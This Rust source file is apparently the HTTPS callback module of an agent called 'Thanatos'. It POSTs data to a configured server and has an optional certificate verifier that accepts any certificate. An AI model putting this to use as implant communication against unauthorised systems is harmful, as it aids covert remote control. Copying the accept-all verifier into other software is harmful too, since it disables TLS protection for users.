use std::io::Write;
use std::net::TcpStream;
use std::sync::Arc;

use agent_utils::{
    debug_invoke,
    errors::{ProfileInternalError, ThanatosError},
};

#[cfg(feature = "self-signed-certs")]
use rustls::{
    client::{ServerCertVerified, ServerCertVerifier},
    {Certificate, ServerName},
};

use super::{HttpRequest, HttpResponse, HttpVerb};

#[cfg(feature = "self-signed-certs")]
struct SelfSignedCertVerifier;

#[cfg(feature = "self-signed-certs")]
impl ServerCertVerifier for SelfSignedCertVerifier {
    fn verify_server_cert(
        &self,
        _: &Certificate,
        _: &[Certificate],
        _: &ServerName,
        _: &mut dyn Iterator<Item = &[u8]>,
        _: &[u8],
        _: std::time::SystemTime,
    ) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }
}

impl crate::HttpProfile {
    pub fn send_https(&mut self, data: &str) -> Result<String, ThanatosError> {
        let mut root_store = rustls::RootCertStore::empty();
        root_store.add_server_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.0.iter().map(|ta| {
            rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                ta.subject,
                ta.spki,
                ta.name_constraints,
            )
        }));

        #[cfg(not(feature = "self-signed-certs"))]
        let config = rustls::ClientConfig::builder()
            .with_safe_defaults()
            .with_root_certificates(root_store)
            .with_no_client_auth();

        #[cfg(feature = "self-signed-certs")]
        let mut config = rustls::ClientConfig::builder()
            .with_safe_defaults()
            .with_root_certificates(root_store)
            .with_no_client_auth();

        // Please be smart and NOT use self signed certs!
        #[cfg(feature = "self-signed-certs")]
        config
            .dangerous()
            .set_certificate_verifier(Arc::new(SelfSignedCertVerifier));

        let rc_config = Arc::new(config);

        // Set the SNI to match the host header if it exists
        let sni = match self.headers.get("Host") {
            Some(host) => host,
            None => self.host.trim_start_matches("https://"),
        };

        let mut client = rustls::ClientConnection::new(
            rc_config,
            sni.try_into()
                .map_err(|_| ThanatosError::ProfileError(ProfileInternalError::Fatal))?,
        )
        .map_err(|_| ThanatosError::ProfileError(ProfileInternalError::Fatal))?;

        let connection = format!("{}:{}", self.host.trim_start_matches("https://"), self.port);

        let mut socket = debug_invoke!(
            TcpStream::connect(connection),
            ThanatosError::ProfileError(ProfileInternalError::NoConnection)
        );

        let mut stream = rustls::Stream::new(&mut client, &mut socket);

        let req = HttpRequest::new(
            HttpVerb::POST,
            self.host.as_str(),
            config::get_post_uri(),
            &self.headers,
            Some(data),
        )
        .serialize();

        stream
            .write_all(&req)
            .map_err(|_| ThanatosError::ProfileError(ProfileInternalError::Fatal))?;

        let res = HttpResponse::from_reader(stream).map_err(|e| ThanatosError::ProfileError(e))?;

        if res.status != 200 {
            return Err(ThanatosError::ProfileError(ProfileInternalError::Fatal));
        }

        Ok(res.data)
    }
}
